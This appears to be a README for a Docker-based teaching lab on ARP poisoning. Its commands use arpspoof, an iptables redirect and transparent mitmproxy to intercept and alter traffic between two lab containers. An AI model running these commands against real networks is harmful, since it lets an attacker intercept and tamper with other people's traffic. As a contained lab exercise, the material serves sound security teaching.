# ARP Poisoning MITM using Docker containers 

## 1. Start the Containers

```bash
(sudo) docker compose up
```

---

## 2. Enter as the attacker (you will need multiple sessions)

```bash
sudo docker exec -it attacker bash
```
---

## 3. Define rule

With that rule you're telling to intercept all incoming traffic on eth0 destined for port 80 and redirect it internally to port 8080

```bash
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
```

---

## 4. Start ARP Poisoning

Run two `arpspoof` processes in different windows

```bash
arpspoof -i eth0 -t 192.168.90.101 192.168.90.100 
arpspoof -i eth0 -t 192.168.90.100 192.168.90.101 
```

---

## 5. Start mitmproxy in labscripts folder

```bash
cd labscripts && mitmproxy -s tweak_body.py --mode transparent --listen-port 8080 --showhost
```

You can now inspect all the requests and responses exchanged between the client and the server. Additionally, the message "You have been tricked!!!" will be added to each request to confirm that the attack was successfully executed.